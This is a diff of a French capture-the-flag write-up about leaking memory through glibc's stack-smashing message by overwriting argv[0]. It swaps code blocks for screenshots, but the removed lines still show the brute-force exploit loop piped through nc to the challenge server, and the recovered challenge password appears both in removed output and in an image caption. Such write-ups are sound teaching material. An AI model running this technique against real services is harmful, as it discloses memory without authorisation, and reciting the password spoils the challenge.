@@ -10,19 +10,17 @@ nc challenge03.root-me.org 56529
 # Access refused! Bye ...
 ```
 
+<img src="/writeups-img/ssp-01-nc-refused.png" alt="Connexion au service — accès refusé" />
+
 ## Atteindre le canary
 
 En envoyant un buffer volumineux, on finit par écraser le canary et le SSP se déclenche :
 
-```
-*** stack smashing detected ***: ch29 terminated
-```
+<img src="/writeups-img/ssp-02-canary.png" alt="stack smashing detected — le canary est atteint (ch29 terminated)" />
 
 Le point intéressant, c'est le nom affiché par le message : `ch29`. Sur glibc, le SSP affiche l'argument pointé par `__libc_argv[0]` — une **adresse** stockée sur la pile. Si on continue de remplir le buffer, on écrase ce pointeur et le nom disparaît du message :
 
-```
-*** stack smashing detected ***: terminated
-```
+<img src="/writeups-img/ssp-03-arg-removed.png" alt="En remplissant davantage, l'argument affiché disparaît du message SSP" />
 
 En analysant méticuleusement les offsets, on constate qu'à partir de **440 octets**, l'argument affiché par le SSP disparaît : on contrôle donc le pointeur utilisé pour l'affichage.
 
@@ -32,28 +30,15 @@ Puisque le SSP affiche la chaîne pointée par ce pointeur, il suffit de le remp
 
 Par défaut, le binaire ELF (non-PIE) est mappé sur la plage `0x08048000` – `0x08048fff`. On ne connaît pas l'adresse exacte de la chaîne, mais l'espace de recherche est petit : on balaye l'octet de poids faible de l'adresse cible dans cette plage.
 
-Attention : le service bannit temporairement en cas de tentatives trop rapides — il faut y aller progressivement.
+Attention : le service bannit temporairement en cas de tentatives trop rapides — il faut y aller progressivement. On boucle donc en faisant varier l'octet de poids faible de l'adresse pointée, en filtrant sur le message du SSP :
 
-```bash
-# On fait varier l'octet de poids faible de l'adresse pointée (dans la plage du binaire)
-for i in {0..280}; do
-  python2 -c "print 'a' * 440 + '\x'$(printf '%02x' $((0x08 + i)))'\xd7\x04\x08'" \
-    | nc challenge03.root-me.org 56529 | grep -A1 'stack smashing'
-done
-```
+<img src="/writeups-img/ssp-04-bruteforce.png" alt="Boucle de brute-force sur l'octet de l'adresse, filtrée sur 'stack smashing'" />
 
 ## Résultat
 
-À mesure que l'adresse pointée glisse dans la chaîne stockée en mémoire, le SSP en révèle des morceaux successifs :
+À mesure que l'adresse pointée glisse dans la chaîne stockée en mémoire, le SSP en révèle des morceaux successifs — le mot de passe de validation fuit ainsi entièrement, un octet à la fois :
 
-```
-*** stack smashing detected ***: Auth0r!z3dP3rSon4l0nLY terminated
-*** stack smashing detected ***: uth0r!z3dP3rSon4l0nLY terminated
-*** stack smashing detected ***: th0r!z3dP3rSon4l0nLY terminated
-...
-```
-
-Le mot de passe de validation fuit ainsi entièrement, un octet à la fois.
+<img src="/writeups-img/ssp-05-leak.png" alt="Le message SSP révèle progressivement Auth0r!z3dP3rSon4l0nLY" />
 
 ## Flag
 
